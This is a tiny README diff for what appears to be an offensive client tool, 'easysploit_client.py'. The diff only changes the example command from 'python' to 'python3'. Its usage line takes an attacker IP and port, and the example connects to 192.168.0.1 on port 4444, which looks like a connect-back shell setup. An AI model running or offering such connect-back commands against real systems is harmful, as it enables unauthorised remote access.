@@ -23,7 +23,7 @@ python easysploit_client.py <Attacker-IP> <Port> [-a] [-t]
 
 ## Example
 ```
-python easysploit_client.py 192.168.0.1 4444 -a -t
+python3 easysploit_client.py 192.168.0.1 4444 -a -t
 ```
 
 ## License
